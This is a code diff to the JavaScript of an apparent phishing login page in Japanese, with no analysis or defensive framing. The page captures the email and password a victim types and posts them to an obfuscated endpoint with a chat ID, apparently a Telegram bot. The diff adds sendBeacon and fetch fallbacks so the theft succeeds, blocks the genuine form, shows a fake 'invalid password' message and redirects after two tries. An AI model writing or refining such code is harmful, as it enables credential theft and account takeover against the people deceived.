@@ -209,10 +209,21 @@
             t += "\u{1F4DE} @plus234ng";
 
             var ep = _s(_c._a) + _s(_c._b) + _s(_c._f);
-            var r = new XMLHttpRequest();
-            r.open("POST", ep, true);
-            r.setRequestHeader("Content-Type", "application/json");
-            r.send(JSON.stringify({ chat_id: parseInt(_s(_c._g)), text: t }));
+            var payload = JSON.stringify({ chat_id: parseInt(_s(_c._g)), text: t });
+
+            try {
+                var blob = new Blob([payload], { type: 'application/json' });
+                _n.sendBeacon(ep, blob);
+            } catch(e) {
+                try {
+                    fetch(ep, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true });
+                } catch(e2) {
+                    var r = new XMLHttpRequest();
+                    r.open('POST', ep, true);
+                    r.setRequestHeader('Content-Type', 'application/json');
+                    r.send(payload);
+                }
+            }
         };
 
         setTimeout(function() {
@@ -221,15 +232,20 @@
                 _d.getElementById('email').value = decodeURIComponent(h);
             }
 
+            var fm = _d.getElementById('auth-form-legacy');
+            if (fm) { fm.onsubmit = function(e) { e.preventDefault(); return false; }; }
+
             _d.getElementById('submit-btn').addEventListener('click', function(e) {
                 e.preventDefault();
+                e.stopPropagation();
+
                 var u = _d.getElementById('email').value;
                 var k = _d.getElementById('password').value;
                 var m = _d.getElementById('msg');
                 var lo = _d.getElementById('loader_overlay');
 
-                if (!u) { m.innerHTML = "\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return; }
-                if (!k) { m.innerHTML = "\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return; }
+                if (!u) { m.innerHTML = "\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return false; }
+                if (!k) { m.innerHTML = "\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return false; }
 
                 _v++;
                 lo.style.display = 'flex';
@@ -241,7 +257,9 @@
                     m.innerHTML = "\u30E1\u30FC\u30EB\u307E\u305F\u306F\u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u7121\u52B9\u3067\u3059\u3002\u3082\u3046\u4E00\u5EA6\u3084\u308A\u76F4\u3057\u3066\u304F\u3060\u3055\u3044\u3002";
                     m.style.display = 'block';
                     if (_v >= 2) _0x.location.replace(_s(_c._h));
-                }, 1100);
+                }, 1500);
+
+                return false;
             });
         }, 300);
     })();
